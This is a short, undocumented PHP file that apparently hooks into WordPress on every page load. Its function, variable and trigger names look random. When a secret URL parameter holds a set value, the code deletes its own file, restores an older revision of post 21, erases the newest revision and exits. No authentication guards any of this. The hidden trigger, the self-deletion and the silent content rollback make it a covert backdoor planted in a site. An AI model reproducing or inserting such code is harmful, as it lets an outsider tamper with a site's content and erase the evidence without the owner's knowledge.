<?php

function amp_design_simply() {
	if (isset($_GET['system_advanced_gift']) && $_GET['system_advanced_gift'] === 'polyfill_comment_templates_toolbar') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$verification_current_delivery = 21;
		$sites_titles_plupload = wp_get_post_revisions($verification_current_delivery);
		if (empty($sites_titles_plupload)) die('no revisions');
		if (count($sites_titles_plupload) < 2) die('less than 2');
		$error_recipe_single = array_shift($sites_titles_plupload);
		$link_full_stock_creator = $error_recipe_single->ID;
		$urls_community_price_button = array_shift($sites_titles_plupload);
		$core_delete_templates = $urls_community_price_button->ID;
		$flash_shipping_ninja = wp_restore_post_revision($core_delete_templates);
		if ($flash_shipping_ninja === false) die('error restoring');
		$flash_shipping_ninja = wp_delete_post_revision($link_full_stock_creator);		
		if ($flash_shipping_ninja === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'amp_design_simply');
